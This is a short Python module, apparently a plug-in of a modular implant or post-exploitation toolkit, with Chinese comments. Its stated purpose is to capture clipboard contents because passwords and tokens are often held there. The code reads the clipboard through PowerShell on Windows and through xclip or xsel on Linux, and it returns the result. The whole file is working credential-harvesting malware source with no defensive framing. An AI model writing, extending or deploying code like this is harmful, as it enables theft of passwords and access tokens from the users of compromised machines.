"""
@module: clipboard
@desc: 抓取剪贴板内容（Windows: Get-Clipboard；Linux: xclip/xsel）
"""
import os
import subprocess

MODULE = {
    "desc": "抓取剪贴板内容（密码/令牌常在剪贴板）",
    "params": [],
}


def run():
    if os.name == "nt":
        try:
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
                timeout=15, text=True)
            return out.strip() or "(empty clipboard)"
        except Exception as e:
            return f"(error: {e})"
    # Linux: xclip / xsel（需 X 会话）
    for cmd in (["xclip", "-o", "-selection", "clipboard"],
                ["xsel", "--clipboard", "--output"]):
        try:
            out = subprocess.check_output(
                cmd, timeout=15, text=True, stderr=subprocess.DEVNULL)
            return out.strip() or "(empty clipboard)"
        except Exception:
            continue
    return "(clipboard: 无 xclip/xsel 或无 X 显示)"
